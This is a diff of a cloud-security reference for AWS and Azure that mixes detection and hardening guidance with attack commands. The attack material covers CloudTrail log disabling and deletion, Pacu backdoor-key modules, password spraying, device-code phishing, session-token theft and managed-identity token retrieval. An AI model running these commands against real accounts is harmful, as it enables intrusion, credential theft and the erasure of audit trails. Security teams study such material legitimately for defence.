-- **PMapper** — `python3 -m principalmapper graph --create` then `python3 -m principalmapper query "who can become admin?"`
-- **Pacu** — `run iam__privesc_scan`
-- **aws_escalate** — `python aws_escalate.py`
-
-#### Pacu — AWS Exploitation Framework
-
+**Enforce IMDSv2**:
 ```bash
-# Install
-git clone https://github.com/RhinoSecurityLabs/pacu
-cd pacu && pip3 install -r requirements.txt
-
-# Start
-python3 pacu.py
-
-# Key modules
-pacu> run iam__bruteforce_permissions       # Determine effective permissions
-pacu> run iam__enum_users_roles_policies    # Enumerate IAM objects
-pacu> run iam__privesc_scan                 # Identify privilege escalation paths
-pacu> run ec2__enum                         # Enumerate EC2 instances, SGs, VPCs
-pacu> run s3__enum                          # Enumerate S3 buckets
-pacu> run guardduty__enum                   # Check GuardDuty status
-pacu> run cloudtrail__download_event_history # Download CloudTrail events
-pacu> run lambda__enum                      # Enumerate Lambda functions
+# At instance launch
+aws ec2 run-instances --metadata-options "HttpTokens=required,HttpEndpoint=enabled"
+# On existing instance
+aws ec2 modify-instance-metadata-options --instance-id i-xxx --http-tokens required
+# SCP / Config rule to enforce
+# Config rule: ec2-imdsv2-check
 ```
 
-#### ScoutSuite — Multi-Cloud Auditing
-
-```bash
-# Install
-pip3 install scoutsuite
-
-# Run against AWS profile
-python scout.py aws --profile default --report-dir ./reports
-
-# Run against Azure
-python scout.py azure --cli
-
-# Run against GCP
-python scout.py gcp --service-account /path/to/key.json --project project-id
-```
-
-#### Prowler — Compliance Scanning
-
-```bash
-# Install
-pip3 install prowler
-
-# CIS AWS Foundations Benchmark Level 2
-prowler aws --compliance cis_aws_benchmark_level2_aws
-
-# Specific check
-prowler aws -c s3_bucket_public_access_block_enabled
-prowler aws -c iam_root_mfa_enabled
-prowler aws -c cloudtrail_multi_region_enabled
-
-# NIST CSF
-prowler aws --compliance nist_csf_aws
-
-# Output to HTML
-prowler aws -o html -F /tmp/prowler-report
-```
-
-#### CloudTrail Evasion Techniques
-
-```bash
-# Stop logging (requires cloudtrail:StopLogging)
-aws cloudtrail stop-logging --name my-trail
-
-# Delete trail (requires cloudtrail:DeleteTrail)
-aws cloudtrail delete-trail --name my-trail
-
-# Disable log validation (reduces integrity assurance)
-aws cloudtrail update-trail --name my-trail --no-enable-log-file-validation
-
-# Event selector manipulation (removes data event logging)
-aws cloudtrail put-event-selectors --trail-name my-trail \
-  --event-selectors '[{"ReadWriteType":"None","IncludeManagementEvents":false}]'
-```
-
-**Defense:** SCPs denying these actions; GuardDuty `Stealth:IAMUser/CloudTrailLoggingDisabled` finding.
+**Bypass scenarios**: WAF/proxy in same VPC, open redirects followed by metadata server, SSRF via XML external entity (XXE) that supports redirects.
 
 ---
 
-### AWS Logging & Detection
+### 2.3 S3 Misconfiguration Types
 
-#### Key CloudTrail Events to Alert On
-
-| Event | Indicator | Suggested Alert |
+| Misconfiguration | Risk | Detection |
 |---|---|---|
-| `ConsoleLogin` | Without MFA | `additionalEventData.MFAUsed = No AND userIdentity.type = IAMUser` |
-| `CreateUser` | New IAM user | Any `CreateUser` not from IaC pipeline |
-| `CreateAccessKey` | New access key | Any creation, especially for admin users |
-| `AttachUserPolicy` / `AttachRolePolicy` | Policy attachment | Especially attaching `AdministratorAccess` |
-| `AuthorizeSecurityGroupIngress` | Port opened to 0.0.0.0/0 | Any `0.0.0.0/0` or `::/0` ingress rule |
-| `PutBucketPolicy` / `PutBucketAcl` | S3 policy change | Any change; alert on public ACLs |
-| `DisableKey` / `ScheduleKeyDeletion` | KMS key compromise | Any key deletion/disable event |
-| `AssumeRole` | Cross-account | From unusual source account or IP |
-| `StopLogging` | CloudTrail disabled | Immediate critical alert |
-| `DeleteTrail` | CloudTrail deleted | Immediate critical alert |
-| `DeleteDetector` | GuardDuty disabled | Immediate critical alert |
-| `LeaveOrganization` | Account leaving org | Immediate critical alert |
-| `PutBucketPublicAccessBlock` | Block removed | Alert on setting any value to `false` |
-| `RunInstances` | Large instance launch | Alert on `m5.24xlarge` etc. (crypto mining) |
-
-#### CloudWatch Alarms for Security Events
-
-```bash
-# Create metric filter for root account usage
-aws logs put-metric-filter \
-  --log-group-name CloudTrail/DefaultLogGroup \
-  --filter-name RootAccountUsage \
-  --filter-pattern '{$.userIdentity.type="Root" && $.userIdentity.invokedBy NOT EXISTS && $.eventType !="AwsServiceEvent"}' \
-  --metric-transformations metricName=RootAccountUsageCount,metricNamespace=CloudTrailMetrics,metricValue=1
-
-# Create alarm
-aws cloudwatch put-metric-alarm \
-  --alarm-name RootAccountUsage \
-  --metric-name RootAccountUsageCount \
-  --namespace CloudTrailMetrics \
-  --statistic Sum \
-  --period 300 \
-  --threshold 1 \
-  --comparison-operator GreaterThanOrEqualToThreshold \
-  --evaluation-periods 1 \
-  --alarm-actions arn:aws:sns:us-east-1:ACCOUNT:SecurityAlerts
-```
-
-#### GuardDuty Finding Categories
-
-| Category | Example Findings |
-|---|---|
-| **Backdoor** | `Backdoor:EC2/DenialOfService.Tcp` — EC2 sending DoS traffic |
-| **CryptoCurrency** | `CryptoCurrency:EC2/BitcoinTool.B!DNS` — Bitcoin mining traffic |
-| **Impact** | `Impact:S3/AnomalousBehavior.Write` — Unusual S3 write activity |
-| **InitialAccess** | `InitialAccess:IAMUser/AnomalousBehavior` — Unusual sign-in |
-| **Persistence** | `Persistence:IAMUser/NetworkPermissions` — New security group rule |
-| **PrivilegeEscalation** | `PrivilegeEscalation:IAMUser/AnomalousBehavior` |
-| **Recon** | `Recon:EC2/PortProbeUnprotectedPort` — Port scanning |
-| **Stealth** | `Stealth:IAMUser/CloudTrailLoggingDisabled` |
-| **Trojan** | `Trojan:EC2/DropPoint` — EC2 communicating with known dropper |
-| **UnauthorizedAccess** | `UnauthorizedAccess:EC2/SSHBruteForce` |
+| Public bucket ACL (public-read/public-read-write) | Data exposure/modification | S3 Public Access Block, Macie, IAM Access Analyzer |
+| Bucket policy grants `s3:GetObject` to `*` | Data exposure | IAM Access Analyzer |
+| No block public access settings | Future misconfiguration risk | AWS Config: `s3-account-level-public-access-blocks` |
+| No encryption at rest | Data exposure on breach | AWS Config: `s3-bucket-server-side-encryption-enabled` |
+| No versioning | Ransomware vulnerability | AWS Config: `s3-bucket-versioning-enabled` |
+| No MFA delete | Log tampering | Manual check |
+| Overly permissive CORS | Cross-origin data theft | ScoutSuite, Prowler |
+| Pre-signed URL with excessive TTL | Prolonged exposure | Review pre-signed URL expiration policies |
+| Replication to attacker-controlled bucket | Data exfiltration | CloudTrail: PutBucketReplication |
+| Server access logging disabled | No audit trail | AWS Config: `s3-bucket-logging-enabled` |
 
 ---
 
-## 3. Azure Security — Native Services & Controls
+### 2.4 CloudTrail Evasion Techniques
 
-### Microsoft Entra ID & RBAC
+```bash
+# Disable CloudTrail (detectable via GuardDuty: Stealth:IAMUser/CloudTrailLoggingDisabled)
+aws cloudtrail stop-logging --name MyTrail
+aws cloudtrail delete-trail --name MyTrail
 
-Microsoft Entra ID (formerly Azure Active Directory) is the identity provider for all Azure resources and Microsoft 365.
+# Delete log files (if S3 permissions allow)
+aws s3 rm s3://cloudtrail-bucket/AWSLogs/ --recursive
 
-#### Azure RBAC Built-In Roles
+# Minimize API footprint: use read-only APIs (many not logged by default)
+aws iam get-role --role-name Target       # Management event — logged
+aws s3api get-object --bucket b --key k  # Data event — only logged if enabled
 
-| Role | Scope | Use Case |
-|---|---|---|
-| Owner | Sub / RG / Resource | Full control including access management |
-| Contributor | Sub / RG / Resource | Full resource control, no access management |
-| Reader | Sub / RG / Resource | Read-only access to resources |
-| Security Admin | Subscription | Manage security policies, alerts, recommendations |
-| Security Reader | Subscription | Read security posture (Defender for Cloud) |
-| User Access Administrator | Sub / RG / Resource | Manage user access to Azure resources |
-| Network Contributor | Sub / RG | Manage networks, not access |
-| Key Vault Administrator | Key Vault | Full Key Vault data plane access |
-| Key Vault Secrets User | Key Vault | Read secrets only |
-| Monitoring Reader | Sub / RG | Read monitoring data, metrics, logs |
+# Operate via console (some actions may have different log formats)
+# Use legitimate services that generate less scrutiny
+# Timing: perform actions during high-volume periods to blend in
 
-#### Custom RBAC Roles
+# CloudTrail Lake / Athena queries to search for evasion attempts
+# Detect: StopLogging, DeleteTrail, UpdateTrail, PutEventSelectors with exclusions
+```
 
+---
+
+### 2.5 Cross-Account Attacks
+
+**Confused Deputy**: Service A has permissions to access Service B. Attacker tricks A into performing actions on B on their behalf.
+
+**Resource-based policy abuse**: If a resource policy has `"Principal": "*"` or overly broad condition, external principals can directly access.
+
+**Role trust policy misconfiguration**:
 ```json
 {
-  "Name": "Custom Security Analyst",
+  "Effect": "Allow",
+  "Principal": {"AWS": "*"},
+  "Action": "sts:AssumeRole",
+  "Condition": {"StringEquals": {"sts:ExternalId": "12345"}}
+}
+```
+External ID should be treated as a shared secret — do not publish it.
+
+**Supply chain**: Compromise software/AMI/container image used by target account.
+
+---
+
+### 2.6 AWS Exploitation Frameworks
+
+#### Pacu
+
+Open-source AWS exploitation framework (Rhino Security Labs).
+
+```bash
+# Install
+pip install pacu
+# OR git clone https://github.com/RhinoSecurityLabs/pacu && cd pacu && pip install -r requirements.txt
+pacu
+
+# Key modules
+run iam__enum_permissions                    # Enumerate caller permissions
+run iam__enum_users_roles_policies_groups    # Enumerate all IAM entities
+run iam__privesc_scan                        # Scan for privilege escalation paths
+run ec2__enum                               # Enumerate EC2 instances, SGs, VPCs
+run s3__enum                                # Enumerate S3 buckets + ACLs
+run iam__backdoor_users_keys                # Create backdoor access keys
+run lambda__backdoor_new_roles              # Backdoor new roles via event bridge
+run cloudtrail__download_event_history      # Download CloudTrail events
+run iam__detect_honeytokens                 # Check if using canary credentials
+run ebs__enum_snapshots_unauth              # Find public EBS snapshots
+run cognito__attack                         # Cognito user pool attacks
+```
+
+#### Other Tools
+
+**enumerate-iam**: Brute-force which AWS permissions a credential set has.
+```bash
+python enumerate-iam.py --access-key AKIA... --secret-key xxx
+# Tests ~500+ API calls across all services
+```
+
+**aws_consoler**: Converts temporary AWS credentials to console login URL (useful for demonstrating impact).
+```bash
+python aws_consoler.py -a ASIA... -s xxx -t SessionToken
+# Returns: https://signin.aws.amazon.com/federation?Action=login&...
+```
+
+**weirdAAL** (AWS Attack Library): Categorized attack modules for reconnaissance, lateral movement.
+
+**CloudSploit**: Open-source CSPM — 500+ security checks across AWS, Azure, GCP, Oracle.
+```bash
+node index.js --cloud aws --csv report.csv
+```
+
+**Prowler**: Multi-cloud security tool (see Section 6).
+
+**SkyArk**: Identifies shadow admin users and roles in AWS.
+
+**Principal Mapper (PMapper)**: Analyzes IAM to find privilege escalation paths as a graph.
+```bash
+pmapper --profile default graph create
+pmapper --profile default analysis --suggest
+```
+
+---
+
+## 3. Azure Security
+
+### 3.1 Microsoft Entra ID (formerly Azure AD)
+
+#### Conditional Access Policies
+
+Conditional Access is the policy engine for Zero Trust access control in Entra ID. Policies are evaluated for every authentication request.
+
+**Policy structure**:
+- **Assignments (Conditions)**: Who, What, Where, When, How
+- **Access Controls (Grant/Block/Session)**: What happens
+
+**Conditions**:
+
+| Condition | Options |
+|---|---|
+| Users and groups | All users, specific users/groups, guest users, service principals |
+| Cloud apps or actions | All apps, specific apps, user actions (register security info) |
+| Conditions → Sign-in risk | Low, Medium, High (requires Entra ID P2) |
+| Conditions → User risk | Low, Medium, High (requires Entra ID P2) |
+| Conditions → Device platforms | Android, iOS, Windows, macOS, Linux |
+| Conditions → Locations | Named locations (IP ranges, countries), MFA trusted IPs |
+| Conditions → Client apps | Browser, mobile/desktop apps, Exchange ActiveSync, legacy auth clients |
+| Conditions → Filter for devices | Device attributes (compliant, hybrid joined, etc.) |
+
+**Grant Controls**:
+- Require MFA
+- Require device to be marked as compliant (Intune)
+- Require hybrid Azure AD joined device
+- Require approved client app
+- Require app protection policy
+- Require password change (for risky users)
+- Require authentication strength (phishing-resistant MFA)
+
+**Session Controls**:
+- Sign-in frequency (re-authentication interval)
+- Persistent browser session (disable "Stay signed in")
+- Cloud app security — real-time monitoring
+- Disable resilience defaults
+
+**Common CA policy patterns**:
+```
+Policy: Block Legacy Authentication
+- Conditions: Client apps = Exchange ActiveSync + Other clients
+- Grant: Block access
+
+Policy: Require MFA for Admins
+- Conditions: Users = Directory Roles (Global Admin, etc.)
+- Grant: Require MFA + Require phishing-resistant auth strength
+
+Policy: Require Compliant Device for Corporate Apps
+- Conditions: Cloud apps = All cloud apps
+- Grant: Require device compliant OR Hybrid AD joined
+```
+
+#### Privileged Identity Management (PIM)
+
+JIT (Just-In-Time) privileged access management for Entra ID roles and Azure RBAC roles.
+
+**Key concepts**:
+- **Eligible**: User can activate the role when needed (not permanently assigned)
+- **Active**: User has the role right now
+- **Activation**: Self-service via portal/API, may require MFA + justification + approval
+- **Time-bound**: Assignments have start/end dates
+- **Approval workflow**: Designated approvers must approve activation requests
+- **Access reviews**: Periodic review of role assignments (who still needs access?)
+
+```powershell
+# Activate PIM role (PowerShell)
+$ActivationParams = @{
+    PrincipalId = (Get-MgContext).Account
+    RoleDefinitionId = "62e90394-69f5-4237-9190-012177145e10"  # Global Admin
+    DirectoryScopeId = "/"
+    Action = "selfActivate"
+    ScheduledDateTime = (Get-Date -AsUTC).ToString("o")
+    Justification = "Emergency incident response"
+}
+New-MgRoleManagementDirectoryRoleAssignmentScheduleRequest @ActivationParams
+```
+
+#### Identity Governance
+
+**Access Reviews**: Periodic certification of group memberships, app assignments, role assignments.
+- Reviewers: resource owner, members themselves, designated reviewers, managers
+- Auto-apply results: remove access if no response / deny
+- Frequency: weekly, monthly, quarterly, semi-annual, annual
+
+**Entitlement Management**: Access packages — bundles of resources (groups, apps, SharePoint sites) with governance policies.
+- Internal users: self-service request, approval workflow
+- External users (B2B): guest access with expiration
+- Connected organizations: trusted external directories
+
+**Lifecycle Workflows**: Automate identity lifecycle tasks (joiner/mover/leaver).
+
+---
+
+### 3.2 Azure RBAC Hierarchy
+
+```
+Tenant (Entra ID)
+└── Management Group (MG)
+    └── Management Group (nested, up to 6 levels)
+        └── Subscription
+            └── Resource Group
+                └── Resource
+```
+
+**Scope inheritance**: Permissions assigned at higher scope inherit downward (Management Group → Subscription → Resource Group → Resource).
+
+**Built-in roles**:
+
+| Role | Scope | Permissions |
+|---|---|---|
+| Owner | Any | Full control including access management |
+| Contributor | Any | Create/manage resources, no access management |
+| Reader | Any | View resources only |
+| User Access Administrator | Any | Manage user access (RBAC) |
+| Storage Blob Data Owner | Storage | Full blob access including POSIX ACL |
+| Storage Blob Data Contributor | Storage | Read/write/delete blobs |
+| Key Vault Administrator | Key Vault | All key vault data plane operations |
+| Virtual Machine Contributor | VMs | Create/manage VMs, no access to VNet/Storage |
+| Network Contributor | Networking | Manage networks, no access to other resources |
+
+**Custom role definition**:
+```json
+{
+  "Name": "Custom VM Operator",
   "IsCustom": true,
-  "Description": "Can read security posture and view alerts",
-  "Actions": [
-    "Microsoft.Security/*/read",
-    "Microsoft.OperationalInsights/workspaces/*/read",
-    "Microsoft.Insights/alertRules/read"
-  ],
+  "Description": "Can start/stop VMs only",
+  "Actions": ["Microsoft.Compute/virtualMachines/start/action",
+               "Microsoft.Compute/virtualMachines/deallocate/action",
+               "Microsoft.Compute/virtualMachines/read"],
   "NotActions": [],
   "DataActions": [],
   "NotDataActions": [],
-  "AssignableScopes": ["/subscriptions/SUBSCRIPTION_ID"]
+  "AssignableScopes": ["/subscriptions/00000000-1111-2222-3333-444444444444"]
 }
 ```
 
-#### Azure Resource Hierarchy & Policy
-
-```
-Azure AD Tenant
-└── Management Group (Org root)
-    ├── Management Group (Corp)
-    │   ├── Subscription (Prod)
-    │   │   ├── Resource Group (app-rg)
-    │   │   │   └── Resources (VMs, Storage, KV, etc.)
-    │   │   └── Resource Group (network-rg)
-    │   └── Subscription (Dev)
-    └── Management Group (Sandbox)
-```
-
-Azure Policy effects (in order of strictness):
-- `Deny` — Block the resource operation
-- `Audit` — Allow but log non-compliant resources
-- `AuditIfNotExists` — Audit if a related resource doesn't exist
-- `DeployIfNotExists` — Auto-deploy a related resource if missing
-- `Modify` — Alter tags or properties on resources
-
-Built-in policy initiatives: **CIS Azure Foundations**, **NIST SP 800-53**, **PCI DSS**, **ISO 27001**, **HIPAA HITRUST**
-
-#### Azure AD Privileged Identity Management (PIM)
-
-- Just-in-time (JIT) role activation — no standing privileged access
-- Activation requires MFA, approval workflow, and/or justification
-- Time-bounded assignments (max 8 hours for Global Admin by default)
-- Access reviews: periodic re-certification of role assignments
-- Alert on permanent Global Admin assignments, role activation without MFA
-
 ---
 
-### Azure Security Services
+### 3.3 Microsoft Defender for Cloud
 
-| Service | Purpose |
+**Secure Score**: Percentage of security recommendations implemented. Recommendations grouped by controls, each with max score points.
+
+**Workload Protections (Defender Plans)**:
+
+| Plan | Coverage |
 |---|---|
-| **Microsoft Defender for Cloud** | CSPM + CWPP; Secure Score; recommendations and regulatory compliance assessments |
-| **Microsoft Sentinel** | Cloud-native SIEM/SOAR; KQL queries; analytics rules; playbooks (Logic Apps) |
-| **Azure Monitor / Log Analytics** | Centralized log ingestion; KQL query language; metrics and alerts |
-| **Microsoft Defender for Endpoint** | EDR for Windows/macOS/Linux/Android/iOS (formerly ATP) |
-| **Microsoft Defender for Identity** | On-prem Active Directory attack detection (formerly ATA) |
-| **Defender for Office 365 (MDO)** | Email phishing/malware, Safe Links, Safe Attachments, Attack Simulator |
-| **Defender for Cloud Apps (MCAS)** | CASB; shadow IT discovery; session control; conditional access app control |
-| **Azure Firewall Premium** | IDPS, TLS inspection, URL filtering, threat intelligence feeds |
-| **Azure DDoS Protection Standard** | Volumetric, protocol, and resource-layer protection with SLA guarantee |
-| **Azure Key Vault** | Secrets, keys, and certificate management; HSM-backed option; RBAC data plane |
-| **Azure AD PIM** | JIT privileged access, access reviews, activation approvals |
-| **Microsoft Purview** | Data governance, data classification, DLP policies, eDiscovery |
-| **Azure Private Link** | Private connectivity to PaaS services; no public IP required |
-| **Microsoft Entra Conditional Access** | Policy-based access: MFA, device compliance, location, risk level |
-| **Microsoft Entra ID Protection** | Risk-based sign-in and user risk detection; leaked credentials |
+| Defender for Servers | P1: EDR integration; P2: Vulnerability assessment, JIT VM access, adaptive controls |
+| Defender for Containers | Container registries, Kubernetes clusters, container images |
+| Defender for Storage | Malware scanning, sensitive data detection, activity anomalies |
+| Defender for SQL | Azure SQL, SQL on VM, Synapse — threat detection + vulnerability assessment |
+| Defender for App Service | Web app threats, dangling DNS detection |
+| Defender for Key Vault | Unusual access patterns, suspicious operations |
+| Defender for Resource Manager | ARM layer attacks, Azure management API anomalies |
+| Defender for DNS | DNS-based attacks, suspicious DNS queries |
+| Defender for APIs | API discovery, threat detection, posture |
+| Defender for DevOps | Code scanning, IaC scanning, secret scanning in pipelines |
+
+**JIT VM Access** (Defender for Servers P2):
+- Locks down management ports (RDP 3389, SSH 22, WinRM 5985/5986) with NSG deny rules
+- On-demand request opens port for specific source IP for limited time
+- Audit trail in activity log
 
 ---
 
-### Azure Attacks & Misconfigurations
+### 3.4 Microsoft Sentinel
 
-#### Azure AD / Entra ID Attack Techniques
+Cloud-native SIEM/SOAR.
 
-**Password Spray:**
-```powershell
-# MSOLSpray
-Import-Module MSOLSpray.ps1
-Invoke-MSOLSpray -UserList .\users.txt -Password "Winter2024!"
+**Data connectors**: Azure Activity, Entra ID, Microsoft 365 Defender, Defender for Cloud, AWS CloudTrail, GCP Pub/Sub, Syslog, CEF, custom REST API.
 
-# AADInternals
-Import-Module AADInternals
-# Enumerate users
-Get-AADIntLoginInformation -UserName victim@corp.com
-Invoke-AADIntUserEnumerationAsInsider -UserName victim@corp.com
+**Key components**:
+- **Analytics rules**: Scheduled (KQL queries), NRT (near real-time), ML behavior analytics, Fusion (multi-stage attack detection), Microsoft security (alerts from Defender products)
+- **Workbooks**: Dashboards built on Azure Monitor Workbooks (KQL)
+- **Playbooks**: Logic Apps automations triggered by alerts/incidents
+- **UEBA**: User and Entity Behavior Analytics — baseline + anomaly scoring
+- **Threat Intelligence**: TAXII feeds, upload indicators, Microsoft TI
 
-# Spray365 (supports smart lockout evasion)
-python spray365.py spray --credfile creds.csv --execution_plan ./ep.json
-```
-
-**Device Code Phishing (T1528):**
-```
-1. Attacker: GET https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode
-             Body: client_id=...&scope=openid+profile+email+offline_access
-   Response: {"device_code":"...","user_code":"XXXXX-XXXXX","verification_uri":"https://microsoft.com/devicelogin"}
-
-2. Attacker sends victim: "Please visit https://microsoft.com/devicelogin and enter: XXXXX-XXXXX"
-
-3. Victim authenticates with their credentials + MFA
-
-4. Attacker polls: POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token
-                   Body: grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=...
-   Receives: access_token, refresh_token (persistent access)
-```
-
-**Token Theft:**
-- Steal `ESTSAUTH` / `ESTSAUTHPERSISTENT` cookies → replay session without MFA
-- Pass-the-PRT: steal Primary Refresh Token from joined device (`RequestAADRefreshToken`)
-- Evilginx2 / Modlishka: adversary-in-the-middle proxy to capture tokens post-MFA
-
-**Managed Identity Abuse:**
-```bash
-# From an Azure VM with managed identity
-curl -s -H "Metadata: true" \
-  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
-# Returns: access_token for Azure Resource Manager
-```
-
-#### Azure Enumeration Tools
-
-```bash
-# Azure CLI enumeration
-az account list
-az resource list --output table
-az role assignment list --all --output table
-az keyvault list
-az storage account list
-az ad user list --output table
-az ad sp list --output table
-
-# ROADtools — Azure AD enumeration
-pip3 install roadtools
-roadrecon auth -u user@corp.com -p "Password123"
-roadrecon gather
-roadrecon gui    # Web UI at http://localhost:5000
-
-# AzureHound — BloodHound for Azure
-./azurehound -u user@corp.com -p "Password123" list --tenant "corp.com" -o azurehound.json
-# Import into BloodHound for attack path analysis
-```
-
-#### Storage Account Exposure
-
-```bash
-# Check for public blob container access
-az storage container list --account-name targetaccount --output table
-
-# Download from public container (no auth)
-az storage blob download --account-name targetaccount \
-  --container-name public --name file.txt --file ./file.txt --no-auth-required
-
-# Enumerate SAS tokens (look in URLs, logs, source code)
-# SAS token indicators: sv=, ss=, srt=, sp=, se=, st=, spr=, sig=
-```
-
----
-
-### Azure Logging & Detection
-
-#### Key Log Sources
-
-| Log Type | Data | Location |
-|---|---|---|
-| Azure Activity Log | Resource operations (control plane) | Monitor → Activity Log; export to Log Analytics |
-| Microsoft Entra Sign-in Logs | All authentication events | Entra ID → Monitoring → Sign-ins |
-| Microsoft Entra Audit Logs | User/group/role changes | Entra ID → Monitoring → Audit logs |
-| Azure Diagnostic Logs | Resource-specific (KV access, NSG flow) | Per resource → Diagnostic settings |
-| Microsoft Defender for Cloud Alerts | Security findings | Defender for Cloud → Security alerts |
-| Microsoft Sentinel Incidents | Correlated alerts → incidents | Sentinel → Incidents |
-
-#### KQL Detection Examples
-
+**KQL example**:
 ```kql
-// Failed sign-ins — potential password spray
 SigninLogs
-| where ResultType != "0"
-| summarize FailCount = count() by UserPrincipalName, IPAddress, bin(TimeGenerated, 1h)
+| where TimeGenerated > ago(1h)
+| where ResultType != 0  // Failed logins
+| summarize FailCount = count() by UserPrincipalName, IPAddress
 | where FailCount > 10
-| order by FailCount desc
-
-// New Owner role assignment
-AzureActivity
-| where OperationNameValue == "MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE"
-| extend RoleDefId = tostring(parse_json(Properties).roleDefinitionId)
-| where RoleDefId endswith "8e3af657-a8ff-443c-a75c-2fe8c4bcb635"  // Owner role GUID
-| project TimeGenerated, Caller, ResourceGroup, SubscriptionId
-
-// Key Vault secret access from unusual IP
-AzureDiagnostics
-| where ResourceType == "VAULTS" and OperationName == "SecretGet"
-| where ResultType == "Success"
-| summarize count() by CallerIPAddress, identity_claim_appid_g
-| where count_ > 50
-
-// Conditional Access bypass — sign-in without CA policies applied
-SigninLogs
-| where ConditionalAccessStatus == "notApplied"
-| where UserType == "Member"
-| where AppDisplayName in ("Azure Portal", "Microsoft Azure Management")
-
-// MFA not satisfied
-SigninLogs
-| where AuthenticationRequirement == "multiFactorAuthentication"
-| where MfaDetail.authMethod == ""
-| where ResultType == "0"  // Successful without MFA actually completing
+| join kind=inner (
+    SigninLogs | where ResultType == 0  // Successful login
+) on UserPrincipalName
+| project UserPrincipalName, IPAddress, FailCount
 ```
 
 ---
 
-## 4. GCP Security — Native Services & Controls
+### 3.5 Azure Policy
 
-### IAM & Resource Hierarchy
+**Effects** (in evaluation order):
 
-GCP organizes resources in a hierarchy with policy inheritance flowing downward:
-
-```
-Organization (domain.com)
-└── Folders (Business Units)
-    └── Projects (workloads)
-        └── Resources (GCE VMs, GCS buckets, BigQuery, etc.)
-```
-
-**IAM Role Types:**
-
-| Type | Example | Notes |
-|---|---|---|
-| Primitive | Owner, Editor, Viewer | Legacy; overly broad; avoid in prod |
-| Predefined | `roles/compute.instanceAdmin.v1` | Service-specific, curated |
-| Custom | `custom/securityAnalystRole` | Defined per org; union of permissions |
-
-**Service Accounts:**
-- Identities for workloads (VMs, containers, functions)
-- Best practice: dedicated SA per service; no keys if possible (use Workload Identity Federation)
-- Service account impersonation: `iam.serviceAccounts.actAs` permission allows assuming another SA
-
-**Organization Policy Constraints:**
-
-| Constraint | Effect |
+| Effect | Description |
 |---|---|
-| `constraints/compute.requireOsLogin` | Requires OS Login (SSH keys managed by IAM) |
+| Disabled | Policy rule ignored |
+| Audit | Logs non-compliant resources, no enforcement |
+| AuditIfNotExists | Audit if related resource doesn't exist |
+| Append | Add fields to resource request |
+| Modify | Add/replace/remove tags/properties |
+| Deny | Block non-compliant resource creation/modification |
+| DenyAction | Block specific resource actions (e.g., delete) |
+| DeployIfNotExists | Deploy related resource if not present (e.g., deploy diagnostic settings) |
+
+**Initiative**: Collection of policies assigned together (e.g., Azure Security Benchmark initiative).
+
+---
+
+### 3.6 Azure Key Vault
+
+**Access models**:
+- **RBAC** (recommended): Azure RBAC roles control data plane (Key Vault Secrets Officer, Key Vault Crypto User, etc.)
+- **Access Policies** (legacy): Vault-level permissions for Get/List/Set/Delete operations on keys/secrets/certificates
+
+**Soft delete**: Deleted items retained for 7-90 days (default 90), recoverable. **Cannot be disabled once enabled.**
+
+**Purge protection**: Prevents permanent deletion during retention period. Required for BYOK/CMK compliance.
+
+**Key types**: RSA (2048/3072/4096-bit), EC (P-256/P-384/P-521/SECP256K1), oct-HSM (AES keys in HSM).
+
+**Key operations**: encrypt, decrypt, wrapKey, unwrapKey, sign, verify, import, backup, restore, rotate, release (Secure Key Release for confidential computing).
+
+**Certificate management**: Auto-renewal with DigiCert/GlobalSign/Let's Encrypt integration.
+
+---
+
+### 3.7 Managed Identities & Azure AD Connect
+
+**System-assigned Managed Identity**: Tied to resource lifecycle. Created/deleted with the resource. Cannot be shared.
+
+**User-assigned Managed Identity**: Independent lifecycle. Can be assigned to multiple resources. Recommended for shared identity scenarios.
+
+```bash
+# Assign managed identity role
+az role assignment create \
+  --assignee <managed-identity-client-id> \
+  --role "Storage Blob Data Reader" \
+  --scope /subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.Storage/storageAccounts/<account>
+
+# Use managed identity in application (no credentials stored)
+from azure.identity import ManagedIdentityCredential
+from azure.keyvault.secrets import SecretClient
+credential = ManagedIdentityCredential()
+client = SecretClient(vault_url="https://myvault.vault.azure.net/", credential=credential)
+```
+
+**Azure AD Connect security**:
+- Runs on-premises, syncs AD to Entra ID
+- **Password Hash Sync (PHS)**: Hash of hash synced to cloud — attacker with AD Connect access can extract NTLM hashes or perform DCSync equivalent
+- **Pass-through Authentication (PTA)**: Auth agent on-prem processes auth — compromise of PTA agent = ability to authenticate as any user
+- **Federation (ADFS)**: Token signing certificate theft = forge tokens for any user (Golden SAML attack)
+- **AD Connect account** (MSOL_xxxxx): Has high privileges in AD — protect this account
+- **PHS account**: Has DCSync rights (DS-Replication-Get-Changes-All) — monitor for abuse
+
+---
+
+## 4. Azure Attack Techniques
+
+### 4.1 ROADtools
+
+ROADtools is an open-source framework for Azure AD/Entra ID reconnaissance and analysis.
+
+```bash
+# Install
+pip install roadtools
+
+# Authenticate and gather data
+roadrecon auth -u user@contoso.com -p Password1    # Username/password
+roadrecon auth --device-code                        # Device code flow
+roadrecon auth -t <tenant-id> --tokens tokens.json # With existing tokens
+
+# Gather all Azure AD objects
+roadrecon gather                                    # Default: uses token from auth step
+roadrecon gather --mfa-required                     # Gather even with MFA
+roadrecon gather -d db.db                          # Custom database name
+
+# Launch GUI
+roadrecon-gui                                       # Opens web interface at http://localhost:5000
+roadrecon-gui --no-browser -d db.db               # Custom db, no auto-open
+
+# Key data gathered:
+# Users, Groups, Applications, Service Principals
+# Role assignments, Group memberships
+# Conditional Access policies, Named locations
+# Registered devices, MFA methods
+# OAuth permissions, App registrations
+```
+
+**ROADtools Hybrid**: Enumerate Intune-managed devices and their properties.
+
+---
+
+### 4.2 AADInternals
+
+PowerShell module for Entra ID/Office 365 exploitation and research.
+
+```powershell
+# Install
+Install-Module AADInternals -Scope CurrentUser
+Import-Module AADInternals
+
+# Get access token (various methods)
+Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache
+Get-AADIntAccessTokenForMSGraph -SaveToCache
+$token = Get-AADIntAccessTokenForAADGraph -Credentials (Get-Credential)
+
+# User enumeration
+Invoke-AADIntUserEnumerationAsOutsider -UserName "user@contoso.com"  # Check if account exists
+Get-AADIntLoginInformation -UserName "admin@contoso.com"             # Get tenant info
+
+# MFA status
+Get-AADIntMFAStatus -UserPrincipalName user@contoso.com             # Requires AADGraph token
+
+# Token operations
+# Export tokens from browser (Edge/Chrome)
